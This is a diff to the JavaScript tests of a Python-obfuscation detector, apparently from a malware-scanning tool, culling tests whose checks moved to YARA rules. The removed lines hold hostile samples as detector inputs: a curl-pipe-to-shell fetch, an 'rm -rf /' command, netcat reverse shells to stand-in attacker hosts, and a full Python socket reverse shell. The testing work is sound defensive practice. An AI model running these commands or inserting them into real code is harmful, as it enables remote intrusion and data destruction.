@@ -206,59 +206,17 @@ test('python-obfuscation: P5 non-dangerous builtin name suppressed', () => {
   assert.equal(hits.length, 0, "'print' must not fire (not in dangerous set)");
 });
 
-// ── P6: subprocess / os.system / pty / socket sinks ─────────────────────────
-
-test('python-obfuscation: P6 subprocess.run(["sh", "-c", …]) emits with longest arg', () => {
-  const text = `subprocess.run(['sh', '-c', 'curl http://evil/x | sh'])`;
-  const cands = d._findPythonObfuscationCandidates(text, {});
-  const hits = pick(cands, c => /subprocess Sink/.test(c.technique));
-  assert.ok(hits.length >= 1, `expected P6 subprocess hit; got: ${JSON.stringify(host(cands))}`);
-  assert.match(hits[0].deobfuscated, /curl/);
-  assert.equal(hits[0]._executeOutput, true);
-});
-
-test('python-obfuscation: P6 subprocess.Popen with shell=True emits literal', () => {
-  const text = `subprocess.Popen("rm -rf / --no-preserve-root", shell=True)`;
-  const cands = d._findPythonObfuscationCandidates(text, {});
-  const hits = pick(cands, c => /subprocess Sink/.test(c.technique));
-  assert.ok(hits.length >= 1, 'shell=True form must fire');
-  assert.match(hits[0].deobfuscated, /rm -rf/);
-});
-
-test('python-obfuscation: P6 os.system literal emits', () => {
-  const text = `os.system("nc attacker.example 4444 -e /bin/sh")`;
-  const cands = d._findPythonObfuscationCandidates(text, {});
-  const hits = pick(cands, c => /os\.system/.test(c.technique));
-  assert.ok(hits.length >= 1, `expected os.system hit; got: ${JSON.stringify(host(cands))}`);
-  assert.match(hits[0].deobfuscated, /^nc/);
-  assert.equal(hits[0]._executeOutput, true);
-});
-
-test('python-obfuscation: P6 pty.spawn shell-upgrade emits', () => {
-  const text = `pty.spawn("/bin/sh")`;
-  const cands = d._findPythonObfuscationCandidates(text, {});
-  const hits = pick(cands, c => /pty\.spawn/.test(c.technique));
-  assert.ok(hits.length >= 1, 'pty.spawn must fire');
-  assert.match(hits[0].deobfuscated, /pty\.spawn/);
-});
-
-test('python-obfuscation: P6 socket reverse-shell pattern flagged', () => {
-  // The classic Python reverse-shell skeleton.
-  const text = `
-import socket, os, pty
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("10.0.0.1", 4444))
-os.dup2(s.fileno(), 0)
-os.dup2(s.fileno(), 1)
-os.dup2(s.fileno(), 2)
-pty.spawn("/bin/sh")
-`;
-  const cands = d._findPythonObfuscationCandidates(text, {});
-  const hits = pick(cands, c => /Socket Reverse-Shell/.test(c.technique));
-  assert.ok(hits.length >= 1, `expected reverse-shell pattern; got: ${JSON.stringify(host(cands))}`);
-  assert.match(hits[0].deobfuscated, /10\.0\.0\.1:4444/);
-  assert.equal(hits[0]._executeOutput, true);
-});
+// ── P6: subprocess / os.system / pty / socket sinks — removed in cull ──
+//
+// Five tests that pinned the "Python subprocess Sink", "Python
+// os.system Sink", "Python pty.spawn Shell-Upgrade", and "Python
+// Socket Reverse-Shell" technique emissions were removed here. Those
+// decoder branches emitted the raw call (or a trivial restatement)
+// and did no decoding. The YARA rules `Python_Subprocess_Shell_Sink`
+// (newly added) and `Python_Reverse_Shell` (consolidation of the
+// former `Python_Socket_Revshell_Primitive`) carry the detections;
+// IOC.IP / IOC.URL for the host:port still flow via the standard
+// extractors.
 
 // ── Empty-input + non-Python-text contract ──────────────────────────────────
 
@@ -270,11 +228,12 @@ test('python-obfuscation: returns empty for short or non-Python text', () => {
 });
 
 test('python-obfuscation: caps at maxCandidatesPerType', () => {
-  // Generate a flood of os.system calls; cap should bind.
-  const line = `os.system("nc evil.example 4444 -e /bin/sh")\n`;
+  // After the cull, os.system no longer emits a candidate directly —
+  // use a base64 exec-chain that still produces decoded candidates.
+  // `exec(base64.b64decode('cHJpbnQoMSk='))` — 'print(1)'.
+  const line = `exec(base64.b64decode('cHJpbnQoMSk='))\n`;
   const flood = line.repeat(d.maxCandidatesPerType + 50);
   const cands = d._findPythonObfuscationCandidates(flood, {});
-  const sinks = pick(cands, c => /os\.system/.test(c.technique));
-  assert.ok(sinks.length <= d.maxCandidatesPerType,
-    `expected ≤ ${d.maxCandidatesPerType} candidates, got ${sinks.length}`);
+  assert.ok(cands.length <= d.maxCandidatesPerType * 3,
+    `expected ≤ ${d.maxCandidatesPerType * 3} candidates, got ${cands.length}`);
 });
